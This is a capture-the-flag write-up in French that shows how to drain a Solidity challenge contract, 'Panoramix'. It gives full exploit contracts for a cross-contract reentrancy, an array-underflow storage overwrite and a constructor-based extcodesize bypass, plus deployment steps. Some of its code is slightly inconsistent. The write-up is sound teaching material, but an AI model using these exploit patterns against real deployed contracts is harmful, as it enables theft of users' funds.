# Broceliande

## Objectif
L'objectif est de volé tout ses ethers à Panoramix

## Détails
Le smart contract "Panoramix" est vulnérable à une attaque en trois étapes :

    - cross contract reentrancy pour derober les ethers de Panoramix
    - Utiliser de la magie afin :
        - Underflow sur le tableau herbs pour devenir Druide

## Attaque

### Cross Contract Reentrancy

Voici un exellent article pour comprendre les cross contract reentrancy, [ici](https://inspexco.medium.com/cross-contract-reentrancy-attack-402d27a02a15).

La fonction withdraw() du smart contract Elixir renvoie le nombre d'Elixirs qu'un utilisateur possède en Ether selon un ratio de 1:1. Ensuite, le smart contract Elixir brûle tous les Elixirs de l'utilisateur, maintenant ainsi le ratio de 1:1 en permanence. Toutefois, grâce à une "cross-contract reentrancy", il est possible de transférer ses Elixirs à un autre smart contract avant qu'ils ne soient brûlés.

L'attaque utilise deux smart contracts : `Attack1` et `Attack2`.

Le premier, `Attack1`, effectue un dépôt et un retrait sur Panoramix. Lorsque la function `receive()` est appelé, les tokens sont transférés à l'adresse du deuxième smart contract `Attack2`. Ensuite, les tokens d'`Attack2` sont retransférés à l'adresse d'`Attack1`, ce qui permet de récupérer les ethers et les tokens.

Il suffit de répéter cette opération jusqu'à ce que Panoramix n'ait plus d'ethers. Les smart contracts utilisés sont les suivants :


```js
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.19;

import "./panoramix.sol";
import "./elixir.sol";
import "./attack2.sol";

contract Attack1{

    Elixir public elixir;
    Panoramix public panoramix;
    Attack2 public attack2;

    constructor(Panoramix _panoramix, Attack2 _attack2){
        elixir = getafix.elixir();
        panoramix = _panoramix;
        attack2 = _attack2;
    }

    function attack() payable public{
        require(msg.value == 1 ether);
        panoramix.deposit{value : msg.value}();
        while (panoramix.getBalance() != 0){
            panoramix.withdraw();
            attack2.resendElixir();
        }
    }

    receive() external payable{
        elixir.transfer(address(attack2),1 ether);
    }

}
```
```js

    import "./elixir.sol";

    contract Attack2{

        Elixir public elixir;
        address public attack1;

        constructor(Elixir _elixir){
            elixir = _elixir;
        }

        function setAttack1Addr(address addr)public{
            attack1 = addr;
        }

        function resendElixir() public{
            elixir.transfer(attack1,1 ether);
        }

    }
```

### Array Underflow

Pour effectuer cette cross contract reentrancy, il faut être un Druid, représenté par le modifier suivant : 

    modifier onlyDruid(){
        require(isDruid(msg.sender),"Only Druid can trade with Getafix");
        _;
    }

Ainsi en se rendant dans le smart contract Druid, on remarque que n'importe quelle adresse peut devenir druide du moment qu'elle se trouve dans le mapping `druid`.

Pour ce faire, il faut faire un underflow sur le tableau `herbs`, je vais donc d'abord expliquer comment fonctionne cet underflow nous verront après comment le mettre en place.

Ainsi la seconde étape consiste à provoquer cet underflow sur le tableau `herbs`. Pour ce faire, il faut appeler la fonction `getLengthHerbs()`, qui retourne la taille du tableau. Dans cet exemple, la taille est de 2, donc il faut appeler la fonction `popHerb()` 3 fois pour provoquer l'underflow.

Il est possible de provoquer cet underflow car le calcul de la taille du tableau se fait dans les crochets assembly, qui ne vérifient pas les overflow ou underflow.

Une fois l'underflow provoqué, il est possible de modifier n'importe quel slot du smart contract. Dans cet exemple, pour devenir Druide, il faut être dans le mapping `druide`. Les variables des mappings sont stockées dans des slots définis de la façon suivante :

`slot = keccak256(key, slot du mapping)`

Il est possible de calculer cette valeur en utilisant la fonction solidity `findMapLocation`.

Les tableaux dynamiques en Solidity sont stockés de cette façon :

`slot = keccak256(slot du tableau)`

Il est possible de calculer cette valeur en utilisant la fonction solidity `arrLocation`.

En combinant ces deux fonctions, il est possible de calculer l'adresse à modifier pour devenir Druide, comme le montre le smart contract `Calcul`.

[lien vers un article expliquant les underflow sur les tableaux](https://medium.com/@fifiteen82726/solidity-attack-array-underflow-1dc67163948a)

Voici un smartcontract qui retourne l'adresse à réecrire pour devenir Druide : 
```js
    pragma solidity 0.8.19;

    contract Calcul{
        function findMapLocation(uint256 slot, address key) public pure returns (uint256) {
            return uint256(keccak256(abi.encode(key, slot)));
        }

        function arrLocation(uint256 slot) public pure returns (uint256) {
            return uint256(keccak256(abi.encodePacked(slot))) ;
        }

        function calculOverWriting(uint256 slotMapping, address keyMapping, uint256 slotArray) public returns (uint256) {
            uint256 targetMappingAddr = findMapLocation(slotMapping, keyMapping);
            uint256 addrArray = arrLocation(slotArray);
            uint256 indexOverwriting;
            if (targetMappingAddr > addrArray) {
                indexOverwriting = targetMappingAddr - addrArray;
            } else {
                indexOverwriting = type(uint256).max - addrArray + targetMappingAddr - 1;
            }
            return indexOverwriting;
        }

    }
```
### La magie

Pour appeler la function `popHerb()`, il faut valider la condition la condition du modifier suivant : 

    modifier __(){
        require(msg.sender == address(this), "only this can call this");
        _;
    }

Pour ce faire, il faut que ce smart contract appele lui même cette function, le seul moyen se trouve dans la fonction `fallback()`.

La fonction `fallback()` est protégé par la magie, implémentée de la manière suivante : 

    modifier isMagic(){
        require(msg.sender != tx.origin && !isContract(msg.sender),"Only clever Druid can achieve this.");
        _;
    }

    function isContract(address _addr) private view returns (bool){
        uint32 size;
        assembly {
            size := extcodesize(_addr)
        }
        return (size > 0);
    }

La première condition *msg.sender != tx.origin* vérifie que la fonction est appelée depuis un contrat et non depuis une adresse d'origine. 
La deuxième condition *!isContract(msg.sender)* vérifie que l'appelant n'est pas lui-même un contrat en vérifiant la taille du code de l'appelant.

Cependant, il est important de noter qu'il est possible de contourner la deuxième condition en effectuant tous les appels de fonction nécessaires dans le constructeur du contrat appelant, ce faisant sa taille est de 0.

De plus on remarque dans la fonction `fallback()`, qu'il retire le premier byte de msg.data, puis fait un appelle sur lui même. Il faut donc ajouter un bytes, quelconques, avant l'encodage de fonction.

On peut donc écrire notre dernier smart contract Attack0 : 
```js
    pragma solidity 0.8.19;

    import "./druid.sol";

    contract Attack0{
        constructor(Druid _druid, uint256 slotArray, uint256 slotMapping, address keyMapping){

            Druid druid = _druid;

            // underflow Herbs array
            bytes memory input = abi.encodePacked("x",abi.encodeWithSignature("popHerb()"));
            
            address(druid).call(input);
            address(druid).call(input);
            address(druid).call(input);

            //overwrite the right slot to became Druid
            uint256 targetMappingAddr = uint256(keccak256(abi.encode(keyMapping, slotMapping)));
            uint256 addrArray = uint256(keccak256(abi.encodePacked(slotArray)));
            uint256 indexOverwriting;
            if (targetMappingAddr > addrArray) {
                indexOverwriting = targetMappingAddr - addrArray;
            } else {
                indexOverwriting = type(uint256).max - addrArray + targetMappingAddr + 1;
            }

            druid.updateHerb(indexOverwriting,"1");
        }
    }
```

### Chronologie des étapes

Voici les étapes à suivre pour résoudre ce challenge :

1.  Déployer le contrat Attack2.
2.  Déployer le contrat Attack1.
3.  Assigner l'adresse de Attack1 à Attack2 grâce à la fonction `setAttack1Addr()`.
4.  Déployer le contrat Attack0 qui permet à Attack1 de devenir Druide en réécrivant le slot du mapping correspondant.
5.  Exécuter la fonction `attack()` de Attack1 pour déclencher la cross contract reentrancy.
